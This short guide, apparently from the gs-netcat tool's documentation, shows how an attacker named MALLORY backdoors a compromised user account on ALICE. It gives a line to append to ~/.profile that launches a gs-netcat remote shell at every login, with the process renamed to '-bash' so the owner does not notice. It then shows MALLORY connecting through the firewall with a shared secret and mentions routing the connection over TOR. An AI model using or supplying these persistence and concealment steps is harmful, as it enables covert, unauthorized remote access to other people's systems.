# Global Socket User Login Shell (auto-restarting)
**Connect to a firewalled host**

**Problem**  
MALLORY gained access to ALICE but does not have superuser priviledges (root). MALLORY likes to access ALICE remotely. ALICE (and MALLORY) are on two different networks and behind a NAT/Firewall. Neither of them can reach the other.  

**Objective**  
Backdoor ALICE so that MALLORY can access ALICE remotely (without tampering with the firewall, NAT or router settings) and without superuser priviledges (root).

**Solution**  
Start gs-netcat from ALICE's *~/.profile* and to so secretly without ALICE noticing.


On "ALICE" add the following line to the end of *~/.profile*. This will start the gs-netcat backdoor every time that ALICE logs in. The gs-netcat process is hidden as *-bash* and shows up as *-bash* in the process list.
```ShellSession
alice@ALCIE:~$ killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleKeyXXXXChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)
```

Immediately start the backdoor:
```ShellSession
alice@ALICE:~$ source ~/.profile
```

Now log in from "MALLORY" to "ALICE":
```ShellSession
b@MALLORY:~ $ gs-netcat -s ExampleKeyXXXXChangeMe -i
=Secret         : "ExampleKeyXXXXChangeMe"
=Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)
alice@ALICE:~$ id
uid=1001(alice) gid=1001(alice)
alice@ALICE:~$
```

There are other ways to start a backdoor. This is an example.

Many more gs-netcat options are available: For example *-T* to connect via TOR. See the manual page of gs-netcat. 
